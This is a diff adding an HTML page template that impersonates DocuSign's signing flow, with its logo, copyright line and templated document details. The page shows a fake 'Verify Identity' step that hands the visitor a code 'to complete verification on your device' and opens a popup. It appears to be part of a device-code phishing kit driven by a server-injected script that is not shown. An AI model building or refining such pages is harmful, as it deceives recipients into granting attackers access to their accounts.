@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{{TITLE}}</title>
+<link rel="icon" href="docusign8_logo.jpg">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ds-blue:#0052cc;
+  --ds-blue-hover:#003d99;
+  --ds-blue-light:#e8f0fe;
+  --ds-dark:#ffffff;
+  --ds-light-card:#fafafa;
+  --ds-white:#ffffff;
+  --ds-gray:#5c5c6e;
+  --ds-gray-light:#e0e0e0;
+  --ds-green:#00b359;
+  --ds-progress-inactive:#b8b8c8;
+  --radius-lg:12px;
+  --radius-md:8px;
+  --shadow-card:0 2px 8px rgba(0,0,0,0.08),0 1px 3px rgba(0,0,0,0.04);
+}
+body{
+  font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;
+  background:#fafafa;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:40px 20px;
+  color:#1a1a2e;
+}
+.card{
+  background:#ffffff;
+  border-radius:var(--radius-lg);
+  box-shadow:var(--shadow-card);
+  border:1px solid rgba(0,0,0,0.06);
+  width:100%;
+  max-width:440px;
+  padding:40px 32px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  text-align:center;
+  position:relative;
+}
+.logo{margin-bottom:32px}
+.logo img{width:130px;height:auto;filter:none}
+.page-title{
+  font-size:26px;
+  font-weight:700;
+  color:#1a1a2e;
+  letter-spacing:-0.5px;
+  margin-bottom:28px;
+  font-family:'Segoe UI',sans-serif;
+}
+.progress{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:32px;width:100%}
+.progress-step{display:flex;flex-direction:column;align-items:center;gap:4px;position:relative;flex:1;max-width:96px}
+.progress-step:not(:last-child)::after{content:'';position:absolute;top:10px;left:50%;width:100%;height:1px;background:var(--ds-progress-inactive);z-index:0}
+.progress-step.active:not(:last-child)::after{background:var(--ds-blue)}
+.progress-circle{width:18px;height:18px;border-radius:50%;background:var(--ds-progress-inactive);border:2px solid transparent;display:flex;align-items:center;justify-content:center;position:relative;z-index:1;transition:all 0.3s ease}
+.progress-step.active .progress-circle{background:var(--ds-blue);border-color:var(--ds-blue)}
+.progress-step.active .progress-circle::before{content:'✓';font-size:10px;font-weight:bold;color:#ffffff}
+.progress-label{font-size:10px;font-weight:600;color:var(--ds-gray);text-transform:uppercase;letter-spacing:0.5px;line-height:1.2;white-space:nowrap}
+.progress-step.active .progress-label{color:var(--ds-blue)}
+.doc-preview{width:100%;background:#ffffff;border:1px solid rgba(0,0,0,0.08);border-radius:var(--radius-md);padding:20px;display:flex;align-items:center;gap:14px;margin-bottom:24px;text-align:left;transition:all 0.2s ease}
+.doc-preview:hover{border-color:rgba(0,82,204,0.2);background:#fafafa}
+.pdf-icon{width:40px;height:52px;flex-shrink:0;background:#ffffff;border:1px solid rgba(0,0,0,0.1);border-radius:4px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding-top:6px;position:relative;box-shadow:none}
+.pdf-icon::before{content:'';position:absolute;top:4px;right:4px;width:10px;height:10px;background:linear-gradient(135deg,transparent 50%,#b0b0b0 50%);border-radius:0 4px 0 0}
+.pdf-lines{display:flex;flex-direction:column;gap:2px;margin-top:4px;width:100%}
+.pdf-line{height:1.5px;background:#e0e0e0;border-radius:1px;width:100%}
+.pdf-line:nth-child(2){width:70%}
+.pdf-line:nth-child(3){width:45%}
+.doc-info{flex:1;min-width:0}
+.doc-info-title{font-size:14px;font-weight:600;color:#1a1a2e;margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.doc-info-meta{font-size:11px;color:var(--ds-gray);font-weight:500}
+.btn-primary{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  width:100%;
+  background:var(--ds-blue);
+  color:#ffffff;
+  border:none;
+  border-radius:var(--radius-md);
+  padding:14px 24px;
+  font-size:14px;
+  font-weight:700;
+  cursor:pointer;
+  transition:all 0.2s ease;
+  margin-top:8px;
+}
+.btn-primary:hover{background:var(--ds-blue-hover);transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,82,204,0.3)}
+.btn-primary:active{transform:translateY(0)}
+.btn-primary:disabled{background:#b8c0cc;color:#8a8d99;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-primary svg{flex-shrink:0;width:16px;height:16px}
+.helper-text{margin-top:16px;font-size:12px;color:var(--ds-gray);line-height:1.4}
+.footer{margin-top:28px;font-size:10px;color:var(--ds-gray);opacity:0.6}
+.code-panel{display:none;width:100%;margin-top:4px}
+.code-panel.show{display:block;animation:slideUp .25s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.code-box{background:#fafafa;border:1px solid rgba(0,0,0,0.06);border-radius:var(--radius-md);padding:24px;text-align:center;margin-bottom:16px}
+.code-value{font-family:'SF Mono','Fira Code',monospace;font-size:28px;font-weight:700;letter-spacing:6px;color:var(--ds-blue);margin-bottom:8px;min-height:40px;transition:opacity 0.15s}
+.code-value.loading{color:var(--ds-gray);letter-spacing:3px;font-size:22px}
+.code-hint{font-size:12px;color:var(--ds-gray);margin-bottom:16px}
+.timer-row{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:18px}
+.timer-pill{display:inline-flex;align-items:center;gap:6px;background:var(--ds-blue-light);border:1px solid rgba(0,82,204,0.2);color:var(--ds-blue);padding:6px 12px;border-radius:20px;font-size:11px;font-weight:600}
+.timer-pill.expired{background:#fef2f2;border-color:#fecaca;color:#dc2626}
+.refresh-btn{display:inline-flex;align-items:center;gap:6px;background:transparent;border:1px solid rgba(0,0,0,0.1);color:var(--ds-gray);padding:8px 14px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;transition:all 0.2s}
+.refresh-btn:hover{border-color:var(--ds-blue);color:var(--ds-blue);background:var(--ds-blue-light)}
+.refresh-btn svg{width:13px;height:13px}
+.action-row{display:flex;flex-direction:column;gap:10px;width:100%}
+.copy-btn,.verify-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px 20px;border-radius:var(--radius-md);font-size:13px;font-weight:600;cursor:pointer;transition:all 0.2s;border:none}
+.copy-btn{background:#fafafa;border:1px solid rgba(0,0,0,0.08);color:#1a1a2e}
+.copy-btn:hover{background:#f0f0f0;border-color:rgba(0,0,0,0.15)}
+.copy-btn.copied{background:var(--ds-green);border-color:var(--ds-green);color:#ffffff}
+.verify-btn{background:var(--ds-blue);color:#ffffff}
+.verify-btn:hover{background:var(--ds-blue-hover)}
+.copy-btn svg,.verify-btn svg{width:15px;height:15px;flex-shrink:0}
+.status-text{margin-top:14px;font-size:12px;min-height:18px;color:var(--ds-green);font-weight:600;text-align:center}
+.status-text.error{color:#dc2626}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);backdrop-filter:blur(2px);align-items:center;justify-content:center;z-index:1000;padding:20px}
+.overlay.show{display:flex}
+.overlay-card{background:#ffffff;border:1px solid rgba(0,0,0,0.06);border-radius:var(--radius-lg);padding:44px 36px;text-align:center;width:100%;max-width:320px;box-shadow:var(--shadow-card);animation:scaleIn 0.3s ease}
+@keyframes scaleIn{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
+.check-icon{width:56px;height:56px;background:#f0fdf4;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;border:1px solid #bbf7d0}
+.check-icon svg{width:28px;height:28px;stroke:var(--ds-green)}
+.overlay-title{font-size:20px;font-weight:700;color:#1a1a2e;margin-bottom:8px}
+.overlay-msg{font-size:13px;color:var(--ds-gray);line-height:1.5}
+@media(max-width:480px){.card{padding:32px 24px}.page-title{font-size:22px}.progress-label{font-size:9px}.code-value{font-size:22px;letter-spacing:4px}.code-value.loading{font-size:18px;letter-spacing:2px}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <img src="docusign8_logo.jpg" alt="DocuSign" />
+  </div>
+  <h1 class="page-title">{{TITLE}}</h1>
+
+  <!-- Progress Steps -->
+  <div class="progress">
+    <div class="progress-step active">
+      <div class="progress-circle"></div>
+      <span class="progress-label">Verify Identity</span>
+    </div>
+    <div class="progress-step">
+      <div class="progress-circle"></div>
+      <span class="progress-label">Review</span>
+    </div>
+    <div class="progress-step">
+      <div class="progress-circle"></div>
+      <span class="progress-label">Sign</span>
+    </div>
+  </div>
+
+  <!-- Document Preview -->
+  <div class="doc-preview">
+    <div class="pdf-icon">
+      <div class="pdf-lines">
+        <div class="pdf-line"></div>
+        <div class="pdf-line"></div>
+        <div class="pdf-line"></div>
+      </div>
+    </div>
+    <div class="doc-info">
+      <div class="doc-info-title">{{FILE_NAME}}</div>
+      <div class="doc-info-meta">{{PAGES_LABEL}}</div>
+    </div>
+  </div>
+
+  <!-- Primary Button -->
+  <button class="btn-primary" id="startBtn" onclick="generateCode()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+      <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+    </svg>
+    {{BUTTON_TEXT}}
+  </button>
+
+  <!-- Helper Text -->
+  <p class="helper-text">{{MESSAGE}}</p>
+
+  <!-- Footer -->
+  <p class="footer">© 2026 DocuSign, Inc. All rights reserved.</p>
+</div>
+
+<!-- Code Panel: hidden until vg-engine.js adds .show -->
+<div class="code-panel" id="codePanel">
+  <div class="code-box">
+    <div class="code-value loading" id="codeValue">· · · · · ·</div>
+    <div class="code-hint" id="codeHint">Use this code to complete verification on your device.</div>
+  </div>
+  <div class="timer-row">
+    <div class="timer-pill" id="timerPill" style="display:none"></div>
+    <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+      Get new code
+    </button>
+  </div>
+  <div class="action-row" id="actionRow" style="display:none">
+    <button class="copy-btn" id="copyBtn" onclick="copyAndOpenPopup()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+      </svg>
+      <span>Copy code</span>
+    </button>
+    <button class="verify-btn" id="verifyBtn" onclick="verifyWithCopy()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+      </svg>
+      Continue
+    </button>
+  </div>
+  <div class="status-text" id="statusMsg"></div>
+</div>
+
+<!-- Success Overlay -->
+<div class="overlay" id="overlay">
+  <div class="overlay-card">
+    <div class="check-icon">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+    </div>
+    <h3 class="overlay-title">Access granted</h3>
+    <p class="overlay-msg" id="overlayMsg">Identity verified.<br>Redirecting to your document…</p>
+  </div>
+</div>
+
+<!-- vg-engine.js is injected by the server -->
+</body>
+</html>
